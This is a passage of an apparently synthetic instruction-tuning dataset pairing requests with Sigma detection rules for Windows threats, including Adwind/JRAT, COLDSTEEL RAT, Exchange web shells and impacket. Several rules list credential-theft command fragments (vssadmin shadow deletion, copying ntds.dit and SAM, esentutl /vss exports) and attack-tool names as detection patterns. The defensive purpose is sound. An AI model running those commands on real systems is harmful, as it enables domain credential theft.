    "instruction": "Build a Sigma rule with the goal of detecting javaw.exe in AppData folder as used by Adwind / JRAT.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect javaw.exe in AppData folder as used by Adwind / JRAT, you should monitor for registry set actions in Windows where the event type involves setting a value. Specifically, keep an eye on modifications targeting the 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' registry path, a common location for configuring startup programs. Any instance where the target object begins with this path and the details of the modification point to an executable within the '%AppData%\\Roaming\\Oracle\\bin\\' directory should raise an alert. This behavior might indicate an attempt to ensure that malware, such as Adwind or JRAT which often masquerades as a legitimate Java process, persists across reboots by adding itself to the system\u2019s startup items. This kind of activity is considered suspicious and should be flagged for further investigation with a high level of concern due to its potential impact and the tactics, techniques, and procedures associated with persistent access and evasion.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|startswith: 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run'\n        Details|startswith: '%AppData%\\Roaming\\Oracle\\bin\\'\n    condition: selection\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|startswith: 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run'\n        Details|startswith: '%AppData%\\Roaming\\Oracle\\bin\\'\n    condition: selection\nlevel: high\n",
      "question": "javaw.exe in AppData folder as used by Adwind / JRAT",
      "answer": "In order to detect javaw.exe in AppData folder as used by Adwind / JRAT, you should monitor for registry set actions in Windows where the event type involves setting a value. Specifically, keep an eye on modifications targeting the 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' registry path, a common location for configuring startup programs. Any instance where the target object begins with this path and the details of the modification point to an executable within the '%AppData%\\Roaming\\Oracle\\bin\\' directory should raise an alert. This behavior might indicate an attempt to ensure that malware, such as Adwind or JRAT which often masquerades as a legitimate Java process, persists across reboots by adding itself to the system\u2019s startup items. This kind of activity is considered suspicious and should be flagged for further investigation with a high level of concern due to its potential impact and the tactics, techniques, and procedures associated with persistent access and evasion."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting creation of a suspicious ADS (Alternate Data Stream) file by software other than browsers.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the creation of a suspicious ADS (Alternate Data Stream) file by software other than browsers, you should monitor Windows systems for file creations where the content indicates a download from the Internet (marked by '[ZoneTransfer]  ZoneId=3'), specifically targeting files with certain extensions like '.exe', '.scr', '.bat', '.cmd', '.docx', '.hta', '.jse', '.lnk', '.pptx', '.ps', '.reg', '.sct', '.vb', '.wsc', '.wsf', '.xlsx'. These files should also have a ':Zone.Identifier' indicating they've been marked by Windows as coming from the Internet, which can indicate potential risk if such files are executed or opened. The detection focuses on such file creations that were not initiated by well-known browsers (like Chrome, Firefox, Internet Explorer, Edge, and others) or specific known applications like the Snipping Tool. This is done by excluding the creation of these suspicious files when they're associated with the binary paths of these trusted apps, acknowledging that legitimate software might also download files from the Internet but with less associated risk. Additionally, any download activity from browsers not included in the detection's exclusion list or legitimate downloads via scripting or command-line tools that match these criteria should be investigated to determine their legitimacy. This approach is aimed at identifying potential malicious activities involving Alternate Data Streams to evade detection or persist on a system while minimizing the risk of flagging legitimate browser downloads as suspicious.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: create_stream_hash\ndetection:\n    selection:\n        Contents|startswith: '[ZoneTransfer]  ZoneId=3'\n        TargetFilename|endswith: ':Zone.Identifier'\n        TargetFilename|contains:\n            - '.exe'\n            - '.scr'\n            - '.bat'\n            - '.cmd'\n            - '.docx'\n            - '.hta'\n            - '.jse'\n            - '.lnk'\n            - '.pptx'\n            - '.ps'\n            - '.reg'\n            - '.sct'\n            - '.vb'\n            - '.wsc'\n            - '.wsf'\n            - '.xlsx'\n    filter_optional_brave:\n        Image|endswith: '\\brave.exe'\n    filter_optional_chrome:\n        Image:\n            - 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe'\n            - 'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe'\n    filter_optional_firefox:\n        Image:\n            - 'C:\\Program Files\\Mozilla Firefox\\firefox.exe'\n            - 'C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe'\n    filter_optional_ie:\n        Image:\n            - 'C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe'\n            - 'C:\\Program Files\\Internet Explorer\\iexplore.exe'\n    filter_optional_maxthon:\n        Image|endswith: '\\maxthon.exe'\n    filter_optional_edge_1:\n        - Image|startswith: 'C:\\Program Files (x86)\\Microsoft\\EdgeWebView\\Application\\'\n        - Image|endswith: '\\WindowsApps\\MicrosoftEdge.exe'\n        - Image:\n            - 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe'\n            - 'C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe'\n    filter_optional_edge_2:\n        Image|startswith:\n            - 'C:\\Program Files (x86)\\Microsoft\\EdgeCore\\'\n            - 'C:\\Program Files\\Microsoft\\EdgeCore\\'\n        Image|endswith:\n            - '\\msedge.exe'\n            - '\\msedgewebview2.exe'\n    filter_optional_opera:\n        Image|endswith: '\\opera.exe'\n    filter_optional_safari:\n        Image|endswith: '\\safari.exe'\n    filter_optional_seamonkey:\n        Image|endswith: '\\seamonkey.exe'\n    filter_optional_vivaldi:\n        Image|endswith: '\\vivaldi.exe'\n    filter_optional_whale:\n        Image|endswith: '\\whale.exe'\n    filter_optional_snipping_tool:\n        Image|startswith: 'C:\\Program Files\\WindowsApps\\Microsoft.ScreenSketch_'\n        Image|endswith: '\\SnippingTool\\SnippingTool.exe'\n        TargetFilename|startswith: 'C:\\Users\\'\n        TargetFilename|contains|all:\n            - '\\AppData\\Local\\Packages\\Microsoft.ScreenSketch_'\n            - '\\TempState\\Screenshot '\n        TargetFilename|endswith: '.png:Zone.Identifier'\n    condition: selection and not 1 of filter_optional_*\nfalsepositives:\n    - Other legitimate browsers not currently included in the filter (please add them)\n    - Legitimate downloads via scripting or command-line tools (Investigate to determine if it's legitimate)\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: create_stream_hash\ndetection:\n    selection:\n        Contents|startswith: '[ZoneTransfer]  ZoneId=3'\n        TargetFilename|endswith: ':Zone.Identifier'\n        TargetFilename|contains:\n            - '.exe'\n            - '.scr'\n            - '.bat'\n            - '.cmd'\n            - '.docx'\n            - '.hta'\n            - '.jse'\n            - '.lnk'\n            - '.pptx'\n            - '.ps'\n            - '.reg'\n            - '.sct'\n            - '.vb'\n            - '.wsc'\n            - '.wsf'\n            - '.xlsx'\n    filter_optional_brave:\n        Image|endswith: '\\brave.exe'\n    filter_optional_chrome:\n        Image:\n            - 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe'\n            - 'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe'\n    filter_optional_firefox:\n        Image:\n            - 'C:\\Program Files\\Mozilla Firefox\\firefox.exe'\n            - 'C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe'\n    filter_optional_ie:\n        Image:\n            - 'C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe'\n            - 'C:\\Program Files\\Internet Explorer\\iexplore.exe'\n    filter_optional_maxthon:\n        Image|endswith: '\\maxthon.exe'\n    filter_optional_edge_1:\n        - Image|startswith: 'C:\\Program Files (x86)\\Microsoft\\EdgeWebView\\Application\\'\n        - Image|endswith: '\\WindowsApps\\MicrosoftEdge.exe'\n        - Image:\n            - 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe'\n            - 'C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe'\n    filter_optional_edge_2:\n        Image|startswith:\n            - 'C:\\Program Files (x86)\\Microsoft\\EdgeCore\\'\n            - 'C:\\Program Files\\Microsoft\\EdgeCore\\'\n        Image|endswith:\n            - '\\msedge.exe'\n            - '\\msedgewebview2.exe'\n    filter_optional_opera:\n        Image|endswith: '\\opera.exe'\n    filter_optional_safari:\n        Image|endswith: '\\safari.exe'\n    filter_optional_seamonkey:\n        Image|endswith: '\\seamonkey.exe'\n    filter_optional_vivaldi:\n        Image|endswith: '\\vivaldi.exe'\n    filter_optional_whale:\n        Image|endswith: '\\whale.exe'\n    filter_optional_snipping_tool:\n        Image|startswith: 'C:\\Program Files\\WindowsApps\\Microsoft.ScreenSketch_'\n        Image|endswith: '\\SnippingTool\\SnippingTool.exe'\n        TargetFilename|startswith: 'C:\\Users\\'\n        TargetFilename|contains|all:\n            - '\\AppData\\Local\\Packages\\Microsoft.ScreenSketch_'\n            - '\\TempState\\Screenshot '\n        TargetFilename|endswith: '.png:Zone.Identifier'\n    condition: selection and not 1 of filter_optional_*\nfalsepositives:\n    - Other legitimate browsers not currently included in the filter (please add them)\n    - Legitimate downloads via scripting or command-line tools (Investigate to determine if it's legitimate)\nlevel: medium\n",
      "question": "creation of a suspicious ADS (Alternate Data Stream) file by software other than browsers",
      "answer": "In order to detect the creation of a suspicious ADS (Alternate Data Stream) file by software other than browsers, you should monitor Windows systems for file creations where the content indicates a download from the Internet (marked by '[ZoneTransfer]  ZoneId=3'), specifically targeting files with certain extensions like '.exe', '.scr', '.bat', '.cmd', '.docx', '.hta', '.jse', '.lnk', '.pptx', '.ps', '.reg', '.sct', '.vb', '.wsc', '.wsf', '.xlsx'. These files should also have a ':Zone.Identifier' indicating they've been marked by Windows as coming from the Internet, which can indicate potential risk if such files are executed or opened. The detection focuses on such file creations that were not initiated by well-known browsers (like Chrome, Firefox, Internet Explorer, Edge, and others) or specific known applications like the Snipping Tool. This is done by excluding the creation of these suspicious files when they're associated with the binary paths of these trusted apps, acknowledging that legitimate software might also download files from the Internet but with less associated risk. Additionally, any download activity from browsers not included in the detection's exclusion list or legitimate downloads via scripting or command-line tools that match these criteria should be investigated to determine their legitimacy. This approach is aimed at identifying potential malicious activities involving Alternate Data Streams to evade detection or persist on a system while minimizing the risk of flagging legitimate browser downloads as suspicious."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting possible successful exploitation for vulnerability described in CVE-2021-26858 by looking for \ncreation of non-standard files on disk by Exchange Server\u2019s Unified Messaging service\nwhich could indicate dropping web shells or other malicious content\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect possible successful exploitation for the vulnerability described in CVE-2021-26858 by looking for the creation of non-standard files on disk by Exchange Server\u2019s Unified Messaging service, which could indicate dropping web shells or other malicious content, you should: Monitor file events in Windows environments, specifically focusing on actions performed by 'UMWorkerProcess.exe', the Unified Messaging Worker Process related to Exchange Server. Be on alert for the creation of new files that do not end with common file extensions used by this service such as 'CacheCleanup.bin', '.txt', '.LOG', '.cfg', or 'cleanup.bin'. The detection of file creation activities by 'UMWorkerProcess.exe' that do not fall into these filtered categories may indicate an attempt to exploit the system by dropping potentially malicious content onto the server. Key information such as the computer name and the names of the created files should be recorded for further investigation. This approach is crucial in identifying and responding to sophisticated attacks aiming to exploit known vulnerabilities in Exchange Server, particularly CVE-2021-26858. It's important to note that due to the specificity of this detection method, the likelihood of false positives is currently unknown, but the severity of potential exploitation makes it a high-priority concern.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: file_event\n    product: windows\ndetection:\n    selection:\n        Image|endswith: 'UMWorkerProcess.exe'\n    filter:\n        TargetFilename|endswith:\n            - 'CacheCleanup.bin'\n            - '.txt'\n            - '.LOG'\n            - '.cfg'\n            - 'cleanup.bin'\n    condition: selection and not filter\nfields:\n    - ComputerName\n    - TargetFilename\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: file_event\n    product: windows\ndetection:\n    selection:\n        Image|endswith: 'UMWorkerProcess.exe'\n    filter:\n        TargetFilename|endswith:\n            - 'CacheCleanup.bin'\n            - '.txt'\n            - '.LOG'\n            - '.cfg'\n            - 'cleanup.bin'\n    condition: selection and not filter\nfields:\n    - ComputerName\n    - TargetFilename\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "possible successful exploitation for vulnerability described in CVE-2021-26858 by looking for \ncreation of non-standard files on disk by Exchange Server\u2019s Unified Messaging service\nwhich could indicate dropping web shells or other malicious content\n",
      "answer": "In order to detect possible successful exploitation for the vulnerability described in CVE-2021-26858 by looking for the creation of non-standard files on disk by Exchange Server\u2019s Unified Messaging service, which could indicate dropping web shells or other malicious content, you should: Monitor file events in Windows environments, specifically focusing on actions performed by 'UMWorkerProcess.exe', the Unified Messaging Worker Process related to Exchange Server. Be on alert for the creation of new files that do not end with common file extensions used by this service such as 'CacheCleanup.bin', '.txt', '.LOG', '.cfg', or 'cleanup.bin'. The detection of file creation activities by 'UMWorkerProcess.exe' that do not fall into these filtered categories may indicate an attempt to exploit the system by dropping potentially malicious content onto the server. Key information such as the computer name and the names of the created files should be recorded for further investigation. This approach is crucial in identifying and responding to sophisticated attacks aiming to exploit known vulnerabilities in Exchange Server, particularly CVE-2021-26858. It's important to note that due to the specificity of this detection method, the likelihood of false positives is currently unknown, but the severity of potential exploitation makes it a high-priority concern."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting creation of new services potentially related to COLDSTEEL RAT.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the creation of new services potentially related to COLDSTEEL RAT, you should: Monitor Windows system logs for events indicating the creation of new services. Focus specifically on logs from the Service Control Manager with an Event ID of 7045. This event signals that a new service has been installed in the system. Pay special attention to services named 'Name', 'msupdate', or 'msupdate2'. Additionally, scrutinize the ImagePath field for any instances containing the path '\\Windows\\System32\\svchost.exe', as this is a common tactic used by malware to disguise themselves as legitimate Windows services. False positives are considered unlikely, indicating the detection methods are highly specific and closely associated with malicious activity. The severity level of this activity is marked as high due to its potential impact related to the COLDSTEEL RAT, implicating this monitoring strategy as critical for identifying and mitigating threats early on.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: system\ndetection:\n    selection:\n        Provider_Name: 'Service Control Manager'\n        EventID: 7045\n        ServiceName:\n            - 'Name'\n            - 'msupdate'\n            - 'msupdate2'\n        ImagePath|contains: '\\Windows\\System32\\svchost.exe'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: system\ndetection:\n    selection:\n        Provider_Name: 'Service Control Manager'\n        EventID: 7045\n        ServiceName:\n            - 'Name'\n            - 'msupdate'\n            - 'msupdate2'\n        ImagePath|contains: '\\Windows\\System32\\svchost.exe'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n",
      "question": "creation of new services potentially related to COLDSTEEL RAT",
      "answer": "In order to detect the creation of new services potentially related to COLDSTEEL RAT, you should: Monitor Windows system logs for events indicating the creation of new services. Focus specifically on logs from the Service Control Manager with an Event ID of 7045. This event signals that a new service has been installed in the system. Pay special attention to services named 'Name', 'msupdate', or 'msupdate2'. Additionally, scrutinize the ImagePath field for any instances containing the path '\\Windows\\System32\\svchost.exe', as this is a common tactic used by malware to disguise themselves as legitimate Windows services. False positives are considered unlikely, indicating the detection methods are highly specific and closely associated with malicious activity. The severity level of this activity is marked as high due to its potential impact related to the COLDSTEEL RAT, implicating this monitoring strategy as critical for identifying and mitigating threats early on."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious commands that could be related to activity that uses volume shadow copy to steal and retrieve hashes from the NTDS.dit file remotely.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious commands that could be related to activity that uses volume shadow copy to steal and retrieve hashes from the NTDS.dit file remotely, you should monitor for the execution of specific commands indicative of this type of malicious behavior. These commands include the use of `vssadmin.exe` to delete or create shadow copies, specifically targeting the C drive, and commands that attempt to copy the NTDS.dit and SAM files from shadow copies. Additionally, the use of `esentutl.exe` with arguments designed to copy or export the NTDS.dit, SAM, and SYSTEM files from shadow copies should be closely watched. This monitoring should be focused on Windows environments, particularly looking at process creation logs. \n\nThe detection of such commands being executed is a strong indicator of an attacker's attempt to access sensitive account information through volume shadow copy service (VSS). Tags associated with this kind of attack would include \"Credential Access\" and \"Persistence\", due to the typical goal of obtaining and potentially manipulating account information for ongoing access. The level of alert for these detections is considered high, given the severe implications of an attacker successfully stealing NTDS.dit hashes.\n\nAdministrative activities could potentially trigger false positives, as legitimate admin work may involve some of these commands for backup or repair purposes. It is crucial to evaluate the context in which these commands are executed, including the parent command line processes, to effectively differentiate between malicious activity and legitimate administrative tasks.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine:\n            - 'vssadmin.exe Delete Shadows'\n            - 'vssadmin create shadow /for=C:'\n            - 'copy \\\\?\\GLOBALROOT\\Device\\\\*\\windows\\ntds\\ntds.dit'\n            - 'copy \\\\?\\GLOBALROOT\\Device\\\\*\\config\\SAM'\n            - 'vssadmin delete shadows /for=C:'\n            - 'reg SAVE HKLM\\SYSTEM '\n            - 'esentutl.exe /y /vss *\\ntds.dit*'\n            - 'esentutl.exe /y /vss *\\SAM'\n            - 'esentutl.exe /y /vss *\\SYSTEM'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Administrative activity\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine:\n            - 'vssadmin.exe Delete Shadows'\n            - 'vssadmin create shadow /for=C:'\n            - 'copy \\\\?\\GLOBALROOT\\Device\\\\*\\windows\\ntds\\ntds.dit'\n            - 'copy \\\\?\\GLOBALROOT\\Device\\\\*\\config\\SAM'\n            - 'vssadmin delete shadows /for=C:'\n            - 'reg SAVE HKLM\\SYSTEM '\n            - 'esentutl.exe /y /vss *\\ntds.dit*'\n            - 'esentutl.exe /y /vss *\\SAM'\n            - 'esentutl.exe /y /vss *\\SYSTEM'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Administrative activity\nlevel: high\n",
      "question": "suspicious commands that could be related to activity that uses volume shadow copy to steal and retrieve hashes from the NTDS.dit file remotely",
      "answer": "In order to detect suspicious commands that could be related to activity that uses volume shadow copy to steal and retrieve hashes from the NTDS.dit file remotely, you should monitor for the execution of specific commands indicative of this type of malicious behavior. These commands include the use of `vssadmin.exe` to delete or create shadow copies, specifically targeting the C drive, and commands that attempt to copy the NTDS.dit and SAM files from shadow copies. Additionally, the use of `esentutl.exe` with arguments designed to copy or export the NTDS.dit, SAM, and SYSTEM files from shadow copies should be closely watched. This monitoring should be focused on Windows environments, particularly looking at process creation logs. \n\nThe detection of such commands being executed is a strong indicator of an attacker's attempt to access sensitive account information through volume shadow copy service (VSS). Tags associated with this kind of attack would include \"Credential Access\" and \"Persistence\", due to the typical goal of obtaining and potentially manipulating account information for ongoing access. The level of alert for these detections is considered high, given the severe implications of an attacker successfully stealing NTDS.dit hashes.\n\nAdministrative activities could potentially trigger false positives, as legitimate admin work may involve some of these commands for backup or repair purposes. It is crucial to evaluate the context in which these commands are executed, including the parent command line processes, to effectively differentiate between malicious activity and legitimate administrative tasks."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution of different compiled Windows binaries of the impacket toolset (based on names or part of their names - could lead to false positives).\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the execution of different compiled Windows binaries of the impacket toolset (based on names or part of their names - could lead to false positives), you should: Monitor the creation of processes on Windows systems for any instances where the name of the executable file indicates it could be part of the impacket collection of networking tools. Specifically, look out for files named or containing certain key strings such as 'goldenPac', 'karmaSMB', 'kintercept', 'ntlmrelayx', 'rpcdump', 'samrdump', 'secretsdump', 'smbexec', 'smbrelayx', 'wmiexec', 'wmipersist' or ending with 'atexec_windows.exe', 'dcomexec_windows.exe', 'dpapi_windows.exe', 'findDelegation_windows.exe', 'GetADUsers_windows.exe', 'GetNPUsers_windows.exe', 'getPac_windows.exe', 'getST_windows.exe', 'getTGT_windows.exe', 'GetUserSPNs_windows.exe', 'ifmap_windows.exe', 'mimikatz_windows.exe', 'netview_windows.exe', 'nmapAnswerMachine_windows.exe', 'opdump_windows.exe', 'psexec_windows.exe', 'rdp_check_windows.exe', 'sambaPipe_windows.exe', 'smbclient_windows.exe', 'smbserver_windows.exe', 'sniffer_windows.exe', 'sniff_windows.exe', 'split_windows.exe', 'ticketer_windows.exe'. Be aware that, while these detections are highly indicative of impacket toolset usage, they may also flag legitimate uses of these tools, thus careful analysis is required to distinguish between malicious activity and approved operations.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|contains:\n            - '\\goldenPac'\n            - '\\karmaSMB'\n            - '\\kintercept'\n            - '\\ntlmrelayx'\n            - '\\rpcdump'\n            - '\\samrdump'\n            - '\\secretsdump'\n            - '\\smbexec'\n            - '\\smbrelayx'\n            - '\\wmiexec'\n            - '\\wmipersist'\n        - Image|endswith:\n            # - '\\addcomputer_windows.exe'\n            - '\\atexec_windows.exe'\n            - '\\dcomexec_windows.exe'\n            - '\\dpapi_windows.exe'\n            # - '\\esentutl_windows.exe'\n            - '\\findDelegation_windows.exe'\n            - '\\GetADUsers_windows.exe'\n            # - '\\getArch_windows.exe'\n            - '\\GetNPUsers_windows.exe'\n            - '\\getPac_windows.exe'\n            - '\\getST_windows.exe'\n            - '\\getTGT_windows.exe'\n            - '\\GetUserSPNs_windows.exe'\n            - '\\ifmap_windows.exe'\n            # - '\\lookupsid_windows.exe'\n            - '\\mimikatz_windows.exe'\n            # - '\\mqtt_check_windows.exe'\n            # - '\\mssqlclient_windows.exe'\n            # - '\\mssqlinstance_windows.exe'\n            - '\\netview_windows.exe'\n            - '\\nmapAnswerMachine_windows.exe'\n            #- '\\ntfs-read_windows.exe'\n            - '\\opdump_windows.exe'\n            # - '\\ping6_windows.exe'\n            # - '\\ping_windows.exe'\n            - '\\psexec_windows.exe'\n            # - '\\raiseChild_windows.exe'\n            - '\\rdp_check_windows.exe'\n            #- '\\registry-read_windows.exe'\n            #- '\\reg_windows.exe'\n            - '\\sambaPipe_windows.exe'\n            # - '\\services_windows.exe'\n            - '\\smbclient_windows.exe'\n            - '\\smbserver_windows.exe'\n            - '\\sniffer_windows.exe'\n            - '\\sniff_windows.exe'\n            - '\\split_windows.exe'\n            - '\\ticketer_windows.exe'\n            # - '\\wmiquery_windows.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate use of the impacket tools\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|contains:\n            - '\\goldenPac'\n            - '\\karmaSMB'\n            - '\\kintercept'\n            - '\\ntlmrelayx'\n            - '\\rpcdump'\n            - '\\samrdump'\n            - '\\secretsdump'\n            - '\\smbexec'\n            - '\\smbrelayx'\n            - '\\wmiexec'\n            - '\\wmipersist'\n        - Image|endswith:\n            # - '\\addcomputer_windows.exe'\n            - '\\atexec_windows.exe'\n            - '\\dcomexec_windows.exe'\n            - '\\dpapi_windows.exe'\n            # - '\\esentutl_windows.exe'\n            - '\\findDelegation_windows.exe'\n            - '\\GetADUsers_windows.exe'\n            # - '\\getArch_windows.exe'\n            - '\\GetNPUsers_windows.exe'\n            - '\\getPac_windows.exe'\n            - '\\getST_windows.exe'\n            - '\\getTGT_windows.exe'\n            - '\\GetUserSPNs_windows.exe'\n            - '\\ifmap_windows.exe'\n            # - '\\lookupsid_windows.exe'\n            - '\\mimikatz_windows.exe'\n            # - '\\mqtt_check_windows.exe'\n            # - '\\mssqlclient_windows.exe'\n            # - '\\mssqlinstance_windows.exe'\n            - '\\netview_windows.exe'\n            - '\\nmapAnswerMachine_windows.exe'\n            #- '\\ntfs-read_windows.exe'\n            - '\\opdump_windows.exe'\n            # - '\\ping6_windows.exe'\n            # - '\\ping_windows.exe'\n            - '\\psexec_windows.exe'\n            # - '\\raiseChild_windows.exe'\n            - '\\rdp_check_windows.exe'\n            #- '\\registry-read_windows.exe'\n            #- '\\reg_windows.exe'\n            - '\\sambaPipe_windows.exe'\n            # - '\\services_windows.exe'\n            - '\\smbclient_windows.exe'\n            - '\\smbserver_windows.exe'\n            - '\\sniffer_windows.exe'\n            - '\\sniff_windows.exe'\n            - '\\split_windows.exe'\n            - '\\ticketer_windows.exe'\n            # - '\\wmiquery_windows.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate use of the impacket tools\nlevel: high\n",
      "question": "execution of different compiled Windows binaries of the impacket toolset (based on names or part of their names - could lead to false positives)",
      "answer": "In order to detect the execution of different compiled Windows binaries of the impacket toolset (based on names or part of their names - could lead to false positives), you should: Monitor the creation of processes on Windows systems for any instances where the name of the executable file indicates it could be part of the impacket collection of networking tools. Specifically, look out for files named or containing certain key strings such as 'goldenPac', 'karmaSMB', 'kintercept', 'ntlmrelayx', 'rpcdump', 'samrdump', 'secretsdump', 'smbexec', 'smbrelayx', 'wmiexec', 'wmipersist' or ending with 'atexec_windows.exe', 'dcomexec_windows.exe', 'dpapi_windows.exe', 'findDelegation_windows.exe', 'GetADUsers_windows.exe', 'GetNPUsers_windows.exe', 'getPac_windows.exe', 'getST_windows.exe', 'getTGT_windows.exe', 'GetUserSPNs_windows.exe', 'ifmap_windows.exe', 'mimikatz_windows.exe', 'netview_windows.exe', 'nmapAnswerMachine_windows.exe', 'opdump_windows.exe', 'psexec_windows.exe', 'rdp_check_windows.exe', 'sambaPipe_windows.exe', 'smbclient_windows.exe', 'smbserver_windows.exe', 'sniffer_windows.exe', 'sniff_windows.exe', 'split_windows.exe', 'ticketer_windows.exe'. Be aware that, while these detections are highly indicative of impacket toolset usage, they may also flag legitimate uses of these tools, thus careful analysis is required to distinguish between malicious activity and approved operations."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Detect use of X509Enrollment.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect use of X509Enrollment, you should monitor the creation of processes on Windows systems for specific command-line arguments that indicate the use of X509Enrollment for potentially malicious purposes. Focus on detecting the presence of either 'X509Enrollment.CBinaryConverter' or the identifier '884e2002-217d-11da-b2a4-000e7bbb2b09' within the command line arguments. These indicators are associated with actions that may utilize the X509Enrollment interface, a component that can be leveraged in various certificate-related operations, potentially including the generation or manipulation of certificates in a manner not intended by system administrators or security policies. It is important to note that while detecting these command-line arguments can point towards malicious activities, there might be legitimate administrative scripts that use this interface for valid reasons. Therefore, any detection should be investigated to distinguish between benign and malicious use, keeping in mind that the detection level is classified as medium due to the possibility of legitimate use cases. The focus on the Windows process creation log source enhances the ability to catch such activities early in their operation.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'X509Enrollment.CBinaryConverter'\n            - '884e2002-217d-11da-b2a4-000e7bbb2b09'\n    condition: selection\nfalsepositives:\n    - Legitimate administrative script\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'X509Enrollment.CBinaryConverter'\n            - '884e2002-217d-11da-b2a4-000e7bbb2b09'\n    condition: selection\nfalsepositives:\n    - Legitimate administrative script\nlevel: medium\n",
      "question": "Detect use of X509Enrollment",
      "answer": "In order to detect use of X509Enrollment, you should monitor the creation of processes on Windows systems for specific command-line arguments that indicate the use of X509Enrollment for potentially malicious purposes. Focus on detecting the presence of either 'X509Enrollment.CBinaryConverter' or the identifier '884e2002-217d-11da-b2a4-000e7bbb2b09' within the command line arguments. These indicators are associated with actions that may utilize the X509Enrollment interface, a component that can be leveraged in various certificate-related operations, potentially including the generation or manipulation of certificates in a manner not intended by system administrators or security policies. It is important to note that while detecting these command-line arguments can point towards malicious activities, there might be legitimate administrative scripts that use this interface for valid reasons. Therefore, any detection should be investigated to distinguish between benign and malicious use, keeping in mind that the detection level is classified as medium due to the possibility of legitimate use cases. The focus on the Windows process creation log source enhances the ability to catch such activities early in their operation."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Security Compliance Center reported a user who exceeded sending limits of the service policies and because of this has been restricted from sending email..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect when a Security Compliance Center reported a user who exceeded sending limits of the service policies and because of this has been restricted from sending email, you should monitor logs from the threat management service, specifically targeting the Microsoft 365 platform. Focus on identifying events where the SecurityComplianceCenter is the event source. Specifically, look for the event named 'User restricted from sending email' with a status marked as success. This indicates a successful action where a user has been restricted due to exceeding sending limits, aligning with security compliance policies. Be aware that it might be challenging to distinguish between genuine policy violations and benign activities that trigger similar alerts, as there could be unknown factors leading to false positives. The severity of this activity is considered medium, suggesting it requires attention to mitigate potential security or compliance issues.",
    "context": "",
